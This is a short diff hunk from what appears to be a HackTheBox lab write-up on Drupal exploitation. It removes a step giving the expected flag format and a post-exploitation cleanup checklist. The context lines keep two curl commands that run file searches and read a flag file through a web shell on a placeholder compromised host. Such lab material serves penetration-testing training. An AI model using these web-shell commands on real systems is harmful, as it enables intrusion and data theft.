@@ -696,21 +696,6 @@ curl -s "http://[COMPROMISED_HOST]/[SHELL_PATH]?[PARAM]=find+/var/www+-name+'*fl
 curl -s "http://[COMPROMISED_HOST]/[SHELL_PATH]?[PARAM]=cat+/var/www/drupal.inlanefreight.local/flag.txt"
 ```
 
-#### Step 7: Expected Flag Format & Cleanup
-
-**Flag Submission:**
-```bash
-# HTB flags typically follow format: HTB{...}
-# Example expected flag: HTB{dr8p4l_c0r3_v8ln3r4b1l1t13s}
-
-# Post-exploitation cleanup:
-# 1. Remove uploaded shells and backdoors
-# 2. Disable PHP filter module (if enabled)
-# 3. Delete created admin users (if applicable)  
-# 4. Remove malicious content nodes
-# 5. Document all changes in pentest report
-```
-
 ---
 
 ## Advanced Exploitation Techniques
